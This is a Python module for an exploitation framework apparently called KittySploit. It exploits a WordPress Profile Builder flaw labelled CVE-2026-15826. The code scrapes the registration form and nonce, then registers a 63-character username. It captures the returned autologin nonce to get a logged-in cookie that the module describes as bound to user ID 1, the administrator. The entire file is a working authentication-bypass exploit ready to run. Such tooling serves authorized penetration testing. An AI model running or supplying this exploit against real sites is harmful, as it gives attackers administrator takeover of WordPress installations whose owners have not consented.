#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Profile Builder CVE-2026-15826 — autologin nonce as user ID 1 (no framework session)."""

import re
import secrets
import string

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Profile Builder CVE-2026-15826 autologin",
        "description": (
            "Auxiliary for CVE-2026-15826: registration with a 61+ character username triggers "
            "Profile Builder autologin bound to user ID 1. Consumes autologin=true&_wpnonce on the "
            "module HTTP client only — does not register a KittySploit framework session; use "
            "wp-admin separately or export cookies manually."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-15826"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-15826"],
        "tags": [
            "wordpress",
            "profile-builder",
            "auth-bypass",
            "auxiliary",
            "cve-2026-15826",
        ],
        "agent": {
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "chain": {
                "suggested_followups": ["scanner/http/profile_builder_cve_2026_15826_detect"],
            },
        },
    }

    path = OptString("/", "WordPress base path", required=False)
    register_path = OptString("/register/", "Registration URL path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        reg = self._join((self.register_path or "/register/").strip())
        page = self.http_request(method="GET", path=reg, allow_redirects=True)
        html = page.text or "" if page else ""
        form_m = re.search(r'name="form_name"[^>]*value="([^"]*)"', html)
        nonce_m = re.search(r'name="register_[^"]*_nonce_field"[^>]*value="([^"]+)"', html)
        if not form_m or not nonce_m:
            print_error("Profile Builder registration form not found")
            return False
        user = "".join(secrets.choice(string.ascii_lowercase) for _ in range(63))
        email = f"pb{secrets.token_hex(4)}@example.test"
        pwd = f"Pb{secrets.token_hex(3)}Aa1!"
        post = self.http_request(
            method="POST",
            path=reg,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "username": user,
                "email": email,
                "passw1": pwd,
                "passw2": pwd,
                "action": "register",
                "form_name": form_m.group(1),
                f"register_{form_m.group(1)}_nonce_field": nonce_m.group(1),
                "register": "Register",
            },
            allow_redirects=False,
        )
        body = post.text or "" if post else ""
        auto_m = re.search(r"autologin=true(?:&|&amp;|&#038;)?_wpnonce=([a-f0-9]+)", body)
        if not auto_m:
            print_error("autologin nonce not returned")
            return False
        autologin_url = f"{reg}?autologin=true&_wpnonce={auto_m.group(1)}"
        login = self.http_request(
            method="GET",
            path=reg,
            params={"autologin": "true", "_wpnonce": auto_m.group(1)},
            allow_redirects=False,
        )
        cookie_names = [c.name for c in login.cookies] if login else []
        logged = [n for n in cookie_names if n.startswith("wordpress_logged_in_")]
        if login and (logged or "wordpress_logged_in" in str(login.headers)):
            print_success("wordpress_logged_in on module HTTP client (not a framework session)")
            if logged:
                print_status(f"Cookie name: {logged[0]}")
            print_status(f"Autologin URL: {autologin_url}")
            print_status("Open wp-admin in the same client or re-auth via framework if supported")
            return True
        print_error("Autologin did not set wordpress_logged_in")
        return False
